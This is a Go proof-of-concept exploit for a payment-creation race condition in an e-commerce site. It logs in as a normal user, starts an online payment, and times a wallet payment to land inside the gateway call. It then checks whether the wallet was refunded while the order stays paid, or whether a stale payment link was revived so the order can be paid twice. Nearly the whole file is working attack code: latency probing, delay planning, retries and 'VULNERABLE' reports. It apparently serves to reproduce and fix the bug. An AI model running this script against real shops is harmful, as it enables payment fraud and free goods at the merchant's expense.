// Command payment-create-race is a site-level proof of concept for the payment
// creation race, using only regular user-facing APIs.
//
// The bug:
//
//  1. A user starts an online payment for an order; the request blocks inside the
//     payment gateway call (the payment row is already committed as initiated).
//  2. The user pays the whole order with the wallet instead; the order becomes
//     paid and the old online payment is marked expired/superseded.
//  3. The stale gateway call returns late:
//     - failure: the failure compensation refunds the order's current
//     wallet_paid_amount back to the wallet while the order stays paid, so the
//     user ends up paying nothing;
//     - success: the stale snapshot Save flips the invalidated payment back to
//     pending and clears the superseded marker, so the caller gets a payable
//     link again and the same order can be paid twice.
//
// The PoC only uses regular user endpoints: login, create order, list the order's
// payment channels, start an online payment, pay with the wallet, and read the
// wallet balance, transactions and order detail. It needs no admin account and no
// fake gateway: it calls the real payment channel configured on the site and uses
// the gateway request's own latency as the race window, retrying with different
// delays for -attempts rounds and printing a VULNERABLE report on a hit.
//
// The race window equals the round trip of the "create online payment" request.
// The PoC first probes it once (create order, start an online payment, measure,
// cancel the order) and derives the wallet payment delay plan from it (a 50ms
// first candidate, then 20%-80% of the window, leaving room for the wallet
// payment's own latency). If the probe fails it falls back to a 15ms-2s scan.
// Use -delay to pin a fixed delay instead.
//
// Usage:
//
//	go run ./scripts/poc/payment-create-race \
//	  -base-url http://127.0.0.1:8080 \
//	  -user-email me@example.com -user-password '******' \
//	  -product-id 1
//
// Flags:
//
//	-base-url       site base URL (required)
//	-user-token     existing user JWT; skips login when set
//	-user-email     login email
//	-user-password  login password
//	-product-id     product ID to order (required)
//	-sku-id         SKU ID (required for multi-SKU products)
//	-quantity       quantity to buy (default 1)
//	-channel-id     payment channel to use; empty picks the first non-wallet channel
//	-attempts       number of attempts (default 6)
//	-delay          fixed delay, e.g. 50ms; empty probes the gateway latency first
//	-wait           max wait for one online payment request (default 90s)
//	-interval       pause between attempts (default 500ms)
//
// Notes:
//
//   - The wallet balance must cover the order amount. A missed attempt buys the
//     order with the wallet for real and cannot be undone, so test with a cheap
//     product and fund the account accordingly.
//   - The race window equals the gateway request latency. It is widest when the
//     gateway is unreachable or slow, which is where the failure variant is
//     easiest to hit; a fast gateway leaves a tiny window that may never hit.
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/shopspring/decimal"
)

const (
	walletProvider = "wallet"
	// refundRemark is the prefix of the refund remark written by the backend
	// ("在线支付创建失败，退回余额"). It is server output, not PoC text, so it
	// must keep matching the backend string verbatim.
	refundRemark = "在线支付创建失败"
)

type options struct {
	baseURL      string
	userToken    string
	userEmail    string
	userPassword string
	productID    uint
	skuID        uint
	quantity     int
	channelID    uint
	attempts     int
	delay        time.Duration
	wait         time.Duration
	interval     time.Duration
}

func main() {
	var opts options
	flag.StringVar(&opts.baseURL, "base-url", "", "site base URL, e.g. http://127.0.0.1:8080 (required)")
	flag.StringVar(&opts.userToken, "user-token", "", "existing user JWT; skips login when set")
	flag.StringVar(&opts.userEmail, "user-email", "", "login email")
	flag.StringVar(&opts.userPassword, "user-password", "", "login password")
	flag.UintVar(&opts.productID, "product-id", 0, "product ID to order (required)")
	flag.UintVar(&opts.skuID, "sku-id", 0, "SKU ID (required for multi-SKU products)")
	flag.IntVar(&opts.quantity, "quantity", 1, "quantity to buy")
	flag.UintVar(&opts.channelID, "channel-id", 0, "payment channel to use; empty picks the first non-wallet channel")
	flag.IntVar(&opts.attempts, "attempts", 6, "number of attempts")
	flag.DurationVar(&opts.delay, "delay", 0, "fixed wallet payment delay, e.g. 50ms; empty probes the gateway latency first")
	flag.DurationVar(&opts.wait, "wait", 90*time.Second, "max wait for one online payment request")
	flag.DurationVar(&opts.interval, "interval", 500*time.Millisecond, "pause between attempts")
	flag.Parse()

	if err := run(opts); err != nil {
		fmt.Fprintf(os.Stderr, "\nPoC FAILED: %v\n", err)
		os.Exit(1)
	}
}

func run(o options) error {
	base := strings.TrimRight(strings.TrimSpace(o.baseURL), "/")
	if base == "" {
		return errors.New("-base-url is required")
	}
	if o.productID == 0 {
		return errors.New("-product-id is required")
	}
	if o.attempts <= 0 {
		o.attempts = 6
	}
	if o.quantity <= 0 {
		o.quantity = 1
	}
	if o.wait <= 0 {
		o.wait = 90 * time.Second
	}

	e := &env{
		base:      base,
		token:     strings.TrimSpace(o.userToken),
		productID: o.productID,
		skuID:     o.skuID,
		quantity:  o.quantity,
		channelID: o.channelID,
	}
	if e.token == "" {
		if o.userEmail == "" || o.userPassword == "" {
			return errors.New("provide -user-token, or both -user-email and -user-password")
		}
		if err := e.login(o.userEmail, o.userPassword); err != nil {
			return err
		}
	}
	fmt.Printf("[setup] site %s, product %d, %d attempt(s)\n", base, o.productID, o.attempts)

	var delayPlan []time.Duration
	if o.delay > 0 {
		fmt.Printf("[setup] using fixed delay %s\n", o.delay)
	} else {
		fmt.Println("[setup] probing online payment creation latency (creates and cancels an order)...")
		window, err := e.measureWindow(o.wait)
		if err != nil {
			fmt.Printf("[setup] probe failed: %v; falling back to the default delay scan\n", err)
			delayPlan = defaultDelays()
		} else {
			fmt.Printf("[setup] race window is about %s (online payment creation round trip)\n", window.Round(time.Millisecond))
			if window < 100*time.Millisecond {
				fmt.Println("[setup] the window is very small, so hits may be rare; prefer a slower channel")
			}
			delayPlan = planDelays(window)
			fmt.Printf("[setup] wallet payment delay plan: %s\n", formatDelays(delayPlan))
		}
	}

	for attempt := 1; attempt <= o.attempts; attempt++ {
		delay := o.delay
		if delay <= 0 {
			delay = delayPlan[(attempt-1)%len(delayPlan)]
		}
		fmt.Printf("\n[attempt %d/%d] paying with the wallet %s after starting the online payment\n",
			attempt, o.attempts, delay)

		hit, err := e.attempt(delay, o.wait)
		if err != nil {
			var fatal *fatalError
			if errors.As(err, &fatal) {
				return fatal.err
			}
			fmt.Printf("[attempt %d/%d] did not complete: %v\n", attempt, o.attempts, err)
		}
		if hit {
			fmt.Println("\nPoC finished: the site reproduces the vulnerability described above.")
			return nil
		}
		time.Sleep(o.interval)
	}

	return fmt.Errorf("%d attempts did not hit the race: raise -attempts, pin a delay with -delay, "+
		"and make sure the payment gateway responds slowly enough (a wider window is easier to hit)", o.attempts)
}

// measureWindow measures the round trip of one online payment creation request as
// an estimate of the race window.
//
// The round trip = server-side validation/commit + gateway round trip + response.
// The commit happens early in the request, so the real window is slightly shorter
// than this value; planDelays takes proportional delays and leaves room for the
// wallet payment. The probe order is cancelled afterwards and never paid.
func (e *env) measureWindow(wait time.Duration) (time.Duration, error) {
	order, err := e.createOrder()
	if err != nil {
		return 0, err
	}
	defer func() { _ = e.cancelOrder(order.OrderNo) }()

	channelID, err := e.pickChannel(order.OrderNo, order.Total)
	if err != nil {
		return 0, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), wait)
	defer cancel()

	start := time.Now()
	_, err = e.payOnline(ctx, order.OrderNo, channelID)
	elapsed := time.Since(start)
	if err != nil {
		// A transport error still means the request took this long, so it is a
		// usable window estimate.
		return elapsed, nil
	}
	return elapsed, nil
}

// defaultDelays is the fallback scan used when the probe fails.
func defaultDelays() []time.Duration {
	return []time.Duration{
		15 * time.Millisecond,
		50 * time.Millisecond,
		150 * time.Millisecond,
		400 * time.Millisecond,
		time.Second,
		2 * time.Second,
	}
}

// planDelays builds the delay plan: a delay must land between "online payment
// committed" and "gateway returned".
//
// The upper bound is the window itself, not a multiple of it: whenever a request's
// real window is wider than the probe value, every delay below the probe value is
// still inside it, so a larger delay does not add a single hit; and once the real
// window is narrower than the probe value, a delay above the probe value lands
// after the gateway returned and only buys the order for nothing. Delays therefore
// stay inside the window; multiples like 200% are pointless.
//
// The lower bound is "online payment committed": a wallet request sent too early
// pays the order before the online payment commits, and the online payment then
// fails because the order is already paid. The first candidate is a small ~50ms
// delay, which is the most robust against the window shrinking; the rest step up
// through 20%-80% of the window to cover a slow server-side commit.
func planDelays(window time.Duration) []time.Duration {
	usable := window - 40*time.Millisecond
	if usable < 10*time.Millisecond {
		usable = 10 * time.Millisecond
	}

	small := 50 * time.Millisecond
	if small > usable/2 {
		small = usable / 2
	}
	if small < 5*time.Millisecond {
		small = 5 * time.Millisecond
	}

	delays := []time.Duration{small.Round(time.Millisecond)}
	for _, fraction := range []float64{0.2, 0.35, 0.5, 0.65, 0.8} {
		delay := time.Duration(float64(usable) * fraction)
		if delay < 5*time.Millisecond {
			delay = 5 * time.Millisecond
		}
		delays = append(delays, delay.Round(time.Millisecond))
	}
	return delays
}

func formatDelays(delays []time.Duration) string {
	parts := make([]string, 0, len(delays))
	for _, delay := range delays {
		parts = append(parts, delay.String())
	}
	return strings.Join(parts, " / ")
}

// ---------------------------------------------------------------------------
// Single attempt
// ---------------------------------------------------------------------------

func (e *env) attempt(delay, wait time.Duration) (bool, error) {
	order, err := e.createOrder()
	if err != nil {
		return false, err
	}
	fmt.Printf("  order %s, amount %s\n", order.OrderNo, order.Total.StringFixed(2))

	channelID, err := e.pickChannel(order.OrderNo, order.Total)
	if err != nil {
		_ = e.cancelOrder(order.OrderNo)
		return false, err
	}

	balanceBefore, err := e.walletBalance()
	if err != nil {
		_ = e.cancelOrder(order.OrderNo)
		return false, fatal("failed to read the wallet: %v", err)
	}
	if balanceBefore.LessThan(order.Total) {
		_ = e.cancelOrder(order.OrderNo)
		return false, fatal("insufficient wallet balance: %s < order amount %s",
			balanceBefore.StringFixed(2), order.Total.StringFixed(2))
	}
	refundsBefore, err := e.refundCount()
	if err != nil {
		_ = e.cancelOrder(order.OrderNo)
		return false, fatal("failed to read wallet transactions: %v", err)
	}

	// Start the online payment first, then pay with the wallet after the delay so
	// the wallet payment lands inside the gateway call.
	type onlineOutcome struct {
		env envelope
		err error
	}
	onlineCh := make(chan onlineOutcome, 1)
	go func() {
		ctx, cancel := context.WithTimeout(context.Background(), wait)
		defer cancel()
		env, err := e.payOnline(ctx, order.OrderNo, channelID)
		onlineCh <- onlineOutcome{env: env, err: err}
	}()

	time.Sleep(delay)

	walletResp, walletErr := e.payWallet(order.OrderNo)
	if walletErr != nil {
		fmt.Printf("  wallet payment did not succeed: %v\n", walletErr)
	}

	var online onlineOutcome
	select {
	case online = <-onlineCh:
	case <-time.After(wait + 5*time.Second):
		_ = e.cancelOrder(order.OrderNo)
		return false, errors.New("the online payment request did not return within the wait window")
	}
	if online.err != nil {
		fmt.Printf("  online payment request error: %v\n", online.err)
	} else {
		fmt.Printf("  online payment returned: status_code=%d msg=%q\n", online.env.StatusCode, online.env.Msg)
	}

	detail, detailErr := e.orderDetail(order.OrderNo)
	balanceAfter, balanceErr := e.walletBalance()
	refundsAfter, refundErr := e.refundCount()

	// The wallet payment succeeded, so the order is settled; now check the late
	// online payment result. Note: call returns no error for HTTP 200 + business
	// error, so status_code must be checked too.
	onlineSucceeded := online.err == nil && online.env.StatusCode == 0
	if walletErr == nil && walletResp.OrderPaid {
		if onlineSucceeded {
			var created createPaymentResp
			_ = json.Unmarshal(online.env.Data, &created)
			if created.PaymentID != nil && (created.QRCode != "" || created.PayURL != "") &&
				detailErr == nil && detail.PaidAt != nil &&
				amountOf(detail.WalletPaidAmount).Equal(order.Total) {
				reportLateSuccess(order, detail, created)
				return true, nil
			}
			fmt.Println("  miss: the online payment completed before the wallet payment (the wallet bought the order normally)")
			return false, nil
		}

		if balanceErr == nil && refundErr == nil &&
			balanceAfter.Equal(balanceBefore) && refundsAfter > refundsBefore &&
			detailErr == nil && detail.PaidAt != nil {
			reportFailure(order, detail, balanceBefore, balanceAfter, refundsAfter-refundsBefore)
			return true, nil
		}
		fmt.Println("  miss: the online payment failed, but the wallet payment did not land in the failure compensation window")
		return false, nil
	}

	// The wallet payment did not succeed and the order is still unpaid: cancel it
	// so it does not hold stock.
	_ = e.cancelOrder(order.OrderNo)
	fmt.Println("  miss: the wallet payment did not complete")
	return false, nil
}

// ---------------------------------------------------------------------------
// Result reports
// ---------------------------------------------------------------------------

func reportFailure(order orderInfo, detail orderDetailResp, before, after decimal.Decimal, refunds int) {
	fmt.Println("\n=== HIT: late failure, wallet funds refunded ===")
	fmt.Printf("[VULNERABLE] wallet balance %s -> %s: the order was paid by the wallet, yet the balance was refunded\n",
		before.StringFixed(2), after.StringFixed(2))
	fmt.Printf("[VULNERABLE] %d new refund transaction(s) (%s)\n", refunds, refundRemark)
	fmt.Printf("[VULNERABLE] the order is still paid: status=%s paid_at=%s wallet_paid=%s online_paid=%s\n",
		detail.Status, derefString(detail.PaidAt),
		amountOf(detail.WalletPaidAmount).StringFixed(2),
		amountOf(detail.OnlinePaidAmount).StringFixed(2))
	fmt.Println("[VULNERABLE] the user paid 0.00 net while the order stays paid, so production would still ship it")
}

func reportLateSuccess(order orderInfo, detail orderDetailResp, created createPaymentResp) {
	fmt.Println("\n=== HIT: late success, stale payment revived ===")
	fmt.Printf("[VULNERABLE] the order is already paid by the wallet: status=%s wallet_paid=%s online_paid=%s\n",
		detail.Status,
		amountOf(detail.WalletPaidAmount).StringFixed(2),
		amountOf(detail.OnlinePaidAmount).StringFixed(2))
	fmt.Printf("[VULNERABLE] the online payment request still returns a payable link: payment_id=%d qr_code=%q pay_url=%q\n",
		*created.PaymentID, created.QRCode, created.PayURL)
	fmt.Println("[VULNERABLE] the same order now has a successful wallet payment and a payable stale link, so the user can pay twice")
}

func derefString(s *string) string {
	if s == nil {
		return "<nil>"
	}
	return *s
}

// ---------------------------------------------------------------------------
// HTTP client
// ---------------------------------------------------------------------------

var httpClient = &http.Client{}

type envelope struct {
	StatusCode int             `json:"status_code"`
	Msg        string          `json:"msg"`
	Data       json.RawMessage `json:"data"`
}

type env struct {
	base      string
	token     string
	productID uint
	skuID     uint
	quantity  int
	channelID uint
}

type fatalError struct {
	err error
}

func (f *fatalError) Error() string { return f.err.Error() }
func (f *fatalError) Unwrap() error { return f.err }

func fatal(format string, args ...any) error {
	return &fatalError{err: fmt.Errorf(format, args...)}
}

func (e *env) call(ctx context.Context, method, path, token string, body any) (envelope, error) {
	var reader io.Reader
	if body != nil {
		raw, err := json.Marshal(body)
		if err != nil {
			return envelope{}, err
		}
		reader = bytes.NewReader(raw)
	}

	req, err := http.NewRequestWithContext(ctx, method, e.base+path, reader)
	if err != nil {
		return envelope{}, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return envelope{}, fmt.Errorf("%s %s: %w", method, path, err)
	}
	defer resp.Body.Close()

	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return envelope{}, fmt.Errorf("%s %s: reading response: %w", method, path, err)
	}

	var env envelope
	if err := json.Unmarshal(raw, &env); err != nil {
		return envelope{}, fmt.Errorf("%s %s: HTTP %d, response is not the unified JSON envelope: %s",
			method, path, resp.StatusCode, truncate(string(raw), 300))
	}
	if resp.StatusCode != http.StatusOK {
		return env, fmt.Errorf("%s %s: HTTP %d: %s", method, path, resp.StatusCode, truncate(string(raw), 300))
	}
	return env, nil
}

func (e *env) must(ctx context.Context, method, path string, body any, out any) error {
	env, err := e.call(ctx, method, path, e.token, body)
	if err != nil {
		return err
	}
	if env.StatusCode != 0 {
		return fmt.Errorf("%s %s: business error %d: %s", method, path, env.StatusCode, env.Msg)
	}
	if out != nil && len(env.Data) > 0 {
		if err := json.Unmarshal(env.Data, out); err != nil {
			return fmt.Errorf("%s %s: decoding data: %w", method, path, err)
		}
	}
	return nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// ---------------------------------------------------------------------------
// User-facing operations
// ---------------------------------------------------------------------------

func (e *env) login(email, password string) error {
	var resp struct {
		RequiresTOTP bool   `json:"requires_totp"`
		Token        string `json:"token"`
		User         struct {
			ID    uint   `json:"id"`
			Email string `json:"email"`
		} `json:"user"`
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	env, err := e.call(ctx, http.MethodPost, "/api/v1/auth/login", "", map[string]any{
		"email":    email,
		"password": password,
	})
	if err != nil {
		return fmt.Errorf("user login failed: %w", err)
	}
	if env.StatusCode != 0 {
		return fmt.Errorf("user login failed: business error %d: %s", env.StatusCode, env.Msg)
	}
	if err := json.Unmarshal(env.Data, &resp); err != nil {
		return fmt.Errorf("decoding login response: %w", err)
	}
	if resp.RequiresTOTP || resp.Token == "" {
		return errors.New("the account has 2FA enabled or login returned no token; pass -user-token instead")
	}
	e.token = resp.Token
	return nil
}

type orderInfo struct {
	OrderNo string
	Total   decimal.Decimal
}

func (e *env) createOrder() (orderInfo, error) {
	item := map[string]any{"product_id": e.productID, "quantity": e.quantity}
	if e.skuID > 0 {
		item["sku_id"] = e.skuID
	}
	var resp struct {
		OrderNo     string `json:"order_no"`
		TotalAmount any    `json:"total_amount"`
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if err := e.must(ctx, http.MethodPost, "/api/v1/orders", map[string]any{
		"items": []map[string]any{item},
	}, &resp); err != nil {
		return orderInfo{}, fmt.Errorf("creating order failed (check product/SKU/stock): %w", err)
	}
	if resp.OrderNo == "" {
		return orderInfo{}, errors.New("creating order returned no order_no")
	}
	return orderInfo{OrderNo: resp.OrderNo, Total: amountOf(resp.TotalAmount)}, nil
}

func (e *env) pickChannel(orderNo string, amount decimal.Decimal) (uint, error) {
	if e.channelID > 0 {
		return e.channelID, nil
	}
	var channels []struct {
		ID           uint   `json:"id"`
		Name         string `json:"name"`
		ProviderType string `json:"provider_type"`
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if err := e.must(ctx, http.MethodPost, "/api/v1/order/payment-channels", map[string]any{
		"order_no": orderNo,
		"amount":   amount.StringFixed(2),
	}, &channels); err != nil {
		return 0, fatal("listing payment channels for the order failed: %v", err)
	}
	for _, channel := range channels {
		if !strings.EqualFold(channel.ProviderType, walletProvider) {
			fmt.Printf("  using payment channel %d (%s / %s)\n", channel.ID, channel.Name, channel.ProviderType)
			return channel.ID, nil
		}
	}
	return 0, fatal("no online payment channel available (only wallet, or no channel configured)")
}

func (e *env) payOnline(ctx context.Context, orderNo string, channelID uint) (envelope, error) {
	return e.call(ctx, http.MethodPost, "/api/v1/payments", e.token, map[string]any{
		"order_no":    orderNo,
		"channel_id":  channelID,
		"use_balance": false,
	})
}

type createPaymentResp struct {
	OrderPaid bool   `json:"order_paid"`
	PaymentID *uint  `json:"payment_id"`
	QRCode    string `json:"qr_code"`
	PayURL    string `json:"pay_url"`
}

func (e *env) payWallet(orderNo string) (createPaymentResp, error) {
	var resp createPaymentResp
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	err := e.must(ctx, http.MethodPost, "/api/v1/payments", map[string]any{
		"order_no":    orderNo,
		"use_balance": true,
	}, &resp)
	return resp, err
}

func (e *env) walletBalance() (decimal.Decimal, error) {
	var wallet struct {
		Balance any `json:"balance"`
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if err := e.must(ctx, http.MethodGet, "/api/v1/wallet", nil, &wallet); err != nil {
		return decimal.Zero, err
	}
	return amountOf(wallet.Balance), nil
}

type walletTxnResp struct {
	Type   string `json:"type"`
	Amount any    `json:"amount"`
	Remark string `json:"remark"`
}

func (e *env) refundCount() (int, error) {
	var txns []walletTxnResp
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if err := e.must(ctx, http.MethodGet, "/api/v1/wallet/transactions?page_size=100", nil, &txns); err != nil {
		return 0, err
	}
	count := 0
	for _, txn := range txns {
		if txn.Type == "order_refund" && strings.Contains(txn.Remark, refundRemark) {
			count++
		}
	}
	return count, nil
}

type orderDetailResp struct {
	Status           string  `json:"status"`
	TotalAmount      any     `json:"total_amount"`
	WalletPaidAmount any     `json:"wallet_paid_amount"`
	OnlinePaidAmount any     `json:"online_paid_amount"`
	PaidAt           *string `json:"paid_at"`
}

func (e *env) orderDetail(orderNo string) (orderDetailResp, error) {
	var detail orderDetailResp
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	if err := e.must(ctx, http.MethodGet, "/api/v1/orders/"+orderNo, nil, &detail); err != nil {
		return orderDetailResp{}, err
	}
	return detail, nil
}

func (e *env) cancelOrder(orderNo string) error {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	return e.must(ctx, http.MethodPost, "/api/v1/orders/"+orderNo+"/cancel", nil, nil)
}

func amountOf(v any) decimal.Decimal {
	raw := strings.TrimSpace(fmt.Sprint(v))
	d, err := decimal.NewFromString(raw)
	if err != nil {
		return decimal.Zero
	}
	return d
}
